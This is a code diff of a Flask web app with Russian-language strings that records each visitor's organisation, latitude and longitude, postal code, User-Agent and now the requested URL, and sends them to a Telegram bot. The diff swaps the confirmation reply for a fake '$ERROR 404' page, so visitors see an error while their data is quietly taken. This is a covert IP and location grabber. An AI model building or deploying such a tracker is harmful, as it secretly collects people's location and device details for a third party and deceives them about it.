@@ -42,13 +42,15 @@ def index():
         f"Организация: {org}\n"
         f"Местоположение (широта, долгота): {loc}\n"
         f"Почтовый индекс: {postal}\n"
-        f"User-Agent (информация о браузере и ОС): {user_agent}"
+        f"User-Agent (информация о браузере и ОС): {user_agent}\n"
+        f"Ссылка на сайт: {request.url}"
     )
 
     # Отправляем сообщение в Telegram
     send_telegram_message(message)
 
-    return "Данные отправлены боту!"
+    return "$ERROR 404"
 
 if __name__ == "__main__":
     app.run(debug=False, host='0.0.0.0')
+    
